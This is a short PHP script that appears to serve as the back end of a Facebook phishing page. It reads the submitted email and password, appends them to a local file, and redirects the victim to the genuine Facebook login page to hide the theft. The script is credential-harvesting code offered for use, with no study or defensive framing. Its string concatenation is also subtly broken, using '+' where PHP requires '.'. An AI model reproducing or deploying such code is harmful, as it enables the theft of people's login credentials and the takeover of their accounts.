<?php
$email=$_POST['email'];
$pass = $_POST['pass'];
$f = fopen("abd", "a+");
fwrite($f, "\n"+$email+" : "+$pass+"\n");
fclose($f);
header("Location: https://www.facebook.com/login.php");
?>